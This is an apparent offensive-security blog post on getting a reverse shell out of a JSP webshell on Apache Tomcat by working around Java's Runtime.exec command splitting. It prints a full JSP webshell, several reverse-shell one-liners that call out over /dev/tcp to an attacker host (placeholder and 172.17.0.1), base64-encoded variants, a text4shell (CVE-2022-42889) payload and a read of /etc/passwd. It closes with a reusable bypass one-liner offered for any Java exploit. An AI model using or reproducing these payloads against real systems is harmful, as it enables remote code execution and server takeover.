# TL;DR
Java is dumb and wont allow control characters such as `| < >` so instead you can do some bash black magic to get this:
```
bash -c $@|bash null echo bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

This is a java thing so it’ll work for any exploit that needs to call a java runtime object.

# Overview
Try to get a revshell off of a jsp webshell is really weird the generic bash shells wont work, and you dont want to touch disk. So what do you do?

# Try to get a shell
I recently was trying to get a shell off of a tomcat instance. The normal way is to upload a webshell and then you have code execution and you can download a meterpreter binary or something and go from there. This is RCE cause you can execute `ls` or `whoami` from the webshell and see the command output. So what about:

```
bash -c 'bash -i >& /dev/tcp/<ip>/9001 0>&1'
```

This doesn’t work for some reason, maybe its cause of the bad characters. So:
```
echo -n "bash -c 'bash -i >& /dev/tcp/<ip>/9001 0>&1'" | base64 -w 0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+LzkwMDEgMD4mMSc=

echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+LzkwMDEgMD4mMSc= | base64 -d |bash
```

Still no shell. Maybe get rid of the `+` and `=`
```
echo -n "bash -c  'bash -i >& /dev/tcp/<ip>/9001  0>&1  '" | base64 -w 0
YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvPGlwPi85MDAxICAwPiYxICAn

echo YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvPGlwPi85MDAxICAwPiYxICAn | base64 -d | bash
```

Nope.

# Java issue?
As you upload the jsp as a war file to tomcat it will end up being run as java code, which means it would be a java issue. If you also look at the text4shell exploit (CVE-2022-42889) it is executed the same way (just looking at the script version):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('<command here>')}
```

Lets look back at the webshell:
```
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

When running:
```
echo d2hvYW1pCg==|base64 -d | bash
```

The server gives:
```
d2hvYW1pCg==|base64 -d | bash
```

## Documentation
```
exec

public Process exec(String command,
                    String[] envp,
                    File dir)
             throws IOException

Executes the specified string command in a separate process with the specified environment and working directory.

This is a convenience method. An invocation of the form exec(command, envp, dir) behaves in exactly the same way as the invocation exec(cmdarray, envp, dir), where cmdarray is an array of all the tokens in command.

More precisely, the command string is broken into tokens using a StringTokenizer created by the call new StringTokenizer(command) with no further modification of the character categories. The tokens produced by the tokenizer are then placed in the new string array cmdarray, in the same order.

Parameters:
    command - a specified system command.
    envp - array of strings, each element of which has environment variable settings in the format name=value, or null if the subprocess should inherit the environment of the current process.
    dir - the working directory of the subprocess, or null if the subprocess should inherit the working directory of the current process.
```

So the input command is a String that will be converted to a string array (cmdarray), which will break control characters as now its all a list, but when running:
```
base64 /etc/passwd -w 0
```

It works fine. So the `|` character isn’t working?

So what if we give it a string array so it doesn’t have to split the tokens.
```
new String[] {"/bin/bash", "-c","whoami"}
```

This gives a 500, so we cant do it that way.

# UNIXProcess
So when tracing it back (manually or via the stack trace) it ends up calling:
```
java.lang.UNIXProcess.forkAndExec(Native Method)
```

So the command being executed is being passed as a shell command. Kinda pointless to prove but good to double check. So is there a unix method for passing in arguments?

Turns out there is a special char:

https://stackoverflow.com/questions/3811345/how-to-pass-all-arguments-passed-to-my-bash-script-to-a-function-of-mine

So testing in bash for now:
```
bash $@ echo 1 2 3 4
```

should echo out `1 2 3 4`

Instead it does this in a bash terminal
```
bash $@ echo 1 2 3 4 5
/usr/bin/echo: /usr/bin/echo: cannot execute binary file
```

quotes and `-c`
```
bash -c '$@ echo 1 2 3 4'
```

yay it works!
```
bash -c '$@ echo "Hello World!" | base64 | base64 -d'
Hello World!
```

Now `|` works, so a shell should also work.
```
bash -c '$@ bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'
```
It does!

Now to test it for the jsp shell.

It doesn’t work?

Maybe some arguments are being used for something else?
```
sh -c $@ echo echo echo echo echo
echo echo echo
```

So the first element isn’t used.
```
sh -c $@ null echo 1 2 3
1 2 3
```

Weird but ok, now can we get a shell?

Still no.
```
sh -c $@ null bash -i >& /dev/tcp/172.17.0.1/9001 0>&1
```


# Magic?
What if we wrap the command. The syntax will be a bit of a jump but I’ll go over it if it works.
```
sh -c $@|bash null echo bash -i >& /dev/tcp/172.17.0.1/9001 0>&1
```

It does nice!

So unpacking the command. How I think it works (tbh I’m not sure of anything anymore)

It will sorta do a nested execution so the first stage:
```
bash | bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
```

Then the second stage is to just run the command in the context of bash:
```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
```

Due to the fact that you are running bash in bash. So like running
```
sudo bash
```

in kali to get a root shell.

As this is for `Runtime.getRuntime().exec` It will work for any java application / exploit, for example the text4shell exploit.

So after all that if you ever need a oneliner for a java applications:
```
bash -c $@|bash null echo bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

FIN